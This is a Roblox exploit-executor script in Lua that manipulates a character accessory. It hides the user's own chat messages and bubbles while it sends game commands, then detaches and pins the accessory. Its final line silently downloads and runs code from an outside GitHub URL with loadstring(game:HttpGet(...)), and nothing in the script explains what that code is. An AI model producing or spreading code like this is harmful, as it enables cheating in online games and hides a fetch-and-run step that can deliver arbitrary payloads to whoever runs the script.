local cloneref = cloneref or function(obj) return obj end
repeat task.wait() until game:IsLoaded()

local playersService = cloneref(game:GetService('Players'))
local chatService = cloneref(game:GetService('TextChatService'))
local runService = cloneref(game:GetService('RunService'))
local coreGui = cloneref(game:GetService('CoreGui'))
local starterGui = cloneref(game:GetService('StarterGui'))
local lplr = playersService.LocalPlayer

local function selfdestruct()
    while task.wait() do end
end

local allowMessages = true
local accessoryId = '118216612240963'

local success, chatWindow = pcall(function()
    return coreGui.ExperienceChat.appLayout.chatWindow.scrollingView.bottomLockedScrollView.RCTScrollView.RCTScrollContentView
end)

if success then
    chatWindow.ChildAdded:Connect(function(chatMessage)
        if not allowMessages then
            chatMessage.Visible = false
        end
    end)
end

chatService.BubbleChatConfiguration.MaxBubbles = 0

local function sendMessage(message)
    if message == '' then return end
    allowMessages = false
    task.wait(0.05)
    chatService:FindFirstChild('TextChannels').RBXGeneral:SendAsync(tostring(message))
    task.delay(0.05, function()
        allowMessages = true
    end)
end

if accessoryId == '' then selfdestruct() end

sendMessage('-rs')
task.wait(2)

if lplr.Character:FindFirstChildWhichIsA('Accessory') then
    sendMessage('-ch')
    task.wait(2)
end

if lplr.Character.Humanoid.RigType ~= Enum.HumanoidRigType.R6 then
    sendMessage('-r6')
    task.wait(2)
end

sendMessage('-gh ' .. accessoryId)
task.wait(2)
sendMessage('-net')
task.wait(2)
sendMessage('-pd')
task.wait(4)

chatService.BubbleChatConfiguration.MaxBubbles = 3

local accessory = lplr.Character:FindFirstChildWhichIsA('Accessory')

task.spawn(function()
    repeat task.wait() until accessory and accessory:FindFirstChild('Handle') and accessory.Handle:FindFirstChildWhichIsA('TouchTransmitter')
    accessory.Handle:FindFirstChildWhichIsA('TouchTransmitter'):Destroy()
end)

if not accessory or not accessory:FindFirstChild('Handle') then selfdestruct() end

local handle = accessory.Handle

repeat
    local weld = handle:FindFirstChildWhichIsA('Weld')
    if weld then weld:Destroy() end
    task.wait()
until not handle:FindFirstChildWhichIsA('Weld')

local angle = 0
local handlePos = handle.Position

runService.Heartbeat:Connect(function(delta)
    handle.Position = handlePos
end)

local accessoryClone = accessory:Clone() -- allows you to see astolfo in first person :)
accessoryClone.Name = 'astolfo'
accessoryClone.Parent = workspace
runService.Heartbeat:Connect(function(delta)
    accessoryClone.Handle.Position = handlePos
end)

repeat
    task.wait()
until (accessory == nil) 
accessoryClone:Destroy()
loadstring(game:HttpGet('https://github.com/popoffroblox/LoadLists/raw/refs/heads/main/loadlists.lua', true))()
